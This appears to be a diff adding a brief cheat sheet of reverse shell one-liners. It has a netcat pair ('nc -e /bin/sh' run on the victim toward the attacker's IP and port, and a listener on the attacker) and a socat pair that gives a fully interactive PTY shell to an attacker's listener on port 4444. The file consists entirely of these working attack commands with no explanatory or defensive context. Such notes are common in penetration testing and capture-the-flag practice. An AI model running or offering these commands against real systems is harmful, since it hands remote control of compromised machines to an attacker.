@@ -1,0 +1,16 @@
+Netcat:
+
+On victim: ./nc -e /bin/sh ip port
+
+On attacker: nc -nlvp port
+
+(For quick and bad)
+
+
+Socat:
+
+Attacker: socat file:'tty' ,raw,echo=0 tcp-listen:4444
+
+Victim: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:(ip):(port)
+
+
